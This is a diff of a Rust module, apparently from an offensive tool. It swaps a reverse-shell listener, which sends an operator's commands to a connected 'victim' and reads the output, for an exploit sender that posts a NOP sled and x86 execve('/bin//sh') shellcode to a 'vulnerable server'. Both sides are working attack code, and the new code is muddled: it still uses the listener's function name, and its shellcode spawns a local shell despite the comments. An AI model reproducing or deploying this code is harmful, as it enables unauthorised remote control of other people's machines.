@@ -1,54 +1,26 @@
-// reverseShellCon.rs (module)
-use std::io::{self, BufRead, BufReader, Write};
-use std::net::{TcpListener, TcpStream};
+use std::net::TcpStream;
+use std::io::Write;
 
-pub fn start_reverse_shell_server() -> Result<(), io::Error> {
-    let listener = TcpListener::bind("0.0.0.0:4444")?; // Listen on all interfaces
-    println!("Reverse shell server started. Waiting for victim...");
+pub fn start_reverse_shell_server() -> Result<(), String> {
+    let target = "127.0.0.1:9999"; // Replace with the vulnerable server's address and port
+    let mut payload = vec![0x90; 256]; // NOP sled
 
-    for stream in listener.incoming() {
-        match stream {
-            Ok(stream) => {
-                println!("Victim connected: {}", stream.peer_addr()?);
-                handle_victim(stream)?; // Handle the victim's session
+    // Add your reverse shell shellcode payload here
+    payload.extend_from_slice(&[
+        0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69,
+        0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
+    ]);
+
+    println!("[+] Connecting to target: {}", target);
+    match TcpStream::connect(target) {
+        Ok(mut stream) => {
+            println!("[+] Connected. Sending payload...");
+            if let Err(e) = stream.write_all(&payload) {
+                return Err(format!("[-] Failed to send payload: {}", e));
             }
-            Err(e) => eprintln!("Failed to accept connection: {}", e),
+            println!("[+] Payload sent. Awaiting reverse shell...");
+            Ok(())
         }
+        Err(e) => Err(format!("[-] Could not connect to target: {}", e)),
     }
-
-    Ok(())
-}
-
-fn handle_victim(mut stream: TcpStream) -> Result<(), io::Error> {
-    let mut reader = BufReader::new(stream.try_clone()?);
-
-    loop {
-        // Prompt the user to enter a command to send to the victim
-        print!("Enter command to send to victim (or 'exit' to disconnect): ");
-        io::stdout().flush()?; // Ensure prompt is displayed
-        let mut command = String::new();
-        io::stdin().read_line(&mut command)?; // Read input from the attacker
-
-        let command = command.trim();
-        if command.eq_ignore_ascii_case("exit") {
-            println!("Disconnecting from victim...");
-            break; // End the session if 'exit' is typed
-        }
-
-        // Send the command to the victim
-        stream.write_all(command.as_bytes())?;
-        stream.write_all(b"\n")?;
-
-        // Read the victim's response and print it
-        let mut response = String::new();
-        reader.read_line(&mut response)?;
-        if response.is_empty() {
-            println!("Victim disconnected.");
-            break; // Exit the loop if no response (victim disconnected)
-        }
-
-        println!("Response:\n{}", response); // Display the response from the victim
-    }
-
-    Ok(())
 }
